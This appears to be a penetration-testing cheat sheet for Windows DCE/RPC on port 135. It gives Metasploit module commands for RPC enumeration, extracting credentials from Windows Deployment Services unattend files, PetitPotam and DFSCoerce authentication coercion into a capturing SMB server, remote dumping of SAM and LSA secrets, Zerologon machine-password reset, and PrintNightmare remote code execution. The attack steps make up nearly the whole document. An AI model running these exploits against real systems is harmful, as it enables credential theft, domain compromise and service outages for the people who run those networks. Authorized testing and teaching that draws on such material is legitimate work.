# 135 - DCE/RPC

## Available Metasploit Options - Info Gathering

    msf > use auxiliary/scanner/dcerpc/endpoint_mapper
    msf > use auxiliary/scanner/dcerpc/hidden
    msf > use auxiliary/scanner/dcerpc/management
    msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

**Reference:** https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/dcerpc/

## Windows Deployment Service RPC - Retrieves Unattend File
This module retrieves the client unattend file from Windows Deployment Services RPC service and parses out the stored credentials.

    msf > use auxiliary/scanner/dcerpc/windows_deployment_services

## PetitPotam 
PetitPotam Exploit Coerces an authentication attempt over SMB to other machines via MS-EFSRPC methods.
1. Set up SMB Server to Capture Traffic:
   
        Msf > use auxiliary/server/capture/smb
        set Verbose True 
2. Run Petitpotam exploit
   
        Msf > use auxiliary/scanner/dcerpc/petitpotam
        Set RHOSTS
        Set Listener
        Set SMBUser
        Set SMBPass
        Set Pipe lsarpc (ex: lsarpc,efsrpc,samr, lsass, netlogon)

**Reference:** https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/dcerpc/petitpotam 

## DFS Coerce 
Coerce an authentication attempt over SMB to other machines via MS-DFSNM methods.

1. Set up SMB Server to Capture Traffic: 

        Msf > use auxiliary/server/capture/smb
        set Verbose True 

2. Run dfscoerce
   
        msf > use auxiliary/scanner/dcerpc/dfscoerce

**Reference:** https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/dcerpc/dfscoerce 

## Windows Secret Dump 
Dumps SAM hashes and LSA secrets (including cached creds) from the remote Windows target without executing any agent locally.
A privileged user is required to run 

    msf > use auxiliary/gather/windows_secrets_dump

**Reference:** https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/gather/windows_secrets_dump 

## ZeroLogin Exploit - Netlogon Weak Cryptographic Authentication 
This module leverages the vulnerability to reset the machine account password to an empty string, which will then allow the attacker to authenticate as the machine account. After exploitation, it's important to restore this password to it's original value. Failure to do so can result in service instability.

    msf > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon

## PrintNightmare Exploit - Print Spooler Remote DLL Injection 
The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted DCERPC request, resulting in remote code execution as NT AUTHORITY\SYSTEM. This module uses the MS-RPRN vector which requires the Print Spooler service to be running.

1. Set up SMB Server to Capture Traffic: 

        Msf > use auxiliary/server/capture/smb 
        set verbose True 

2. Run PrintNightmare

       msf > use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
